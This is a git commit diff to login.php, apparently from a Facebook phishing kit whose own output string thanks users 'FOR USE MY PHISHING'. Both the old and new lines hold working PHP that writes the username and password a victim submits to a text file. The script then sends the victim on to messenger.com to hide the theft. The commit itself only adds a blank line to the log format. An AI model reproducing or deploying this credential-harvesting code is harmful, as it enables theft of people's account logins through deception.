6e67d06a6a589043b903195465cb6267e27504c9
Fearless327 <66976349+Fearless327@users.noreply.github.com>
2021-03-05 08:49:25 +0800

    Update login.php

--- login.php
+++ login.php
@@ -1,5 +1,5 @@
 <?php
-file_put_contents("data.txt", "\n(THANK YOU!! FOR USE MY PHISHING)\n(Coded by Fearless)\nFacebook:\nUsername: " . $_POST['username'] . " \nPassword: " . $_POST['password'] . "\n", FILE_APPEND);
+file_put_contents("data.txt", "\n(THANK YOU!! FOR USE MY PHISHING)\n(Coded by Fearless)\n\nFacebook:\nUsername: " . $_POST['username'] . " \nPassword: " . $_POST['password'] . "\n", FILE_APPEND);
 header('Location: https://www.messenger.com/desktop');
 exit();
 ?>
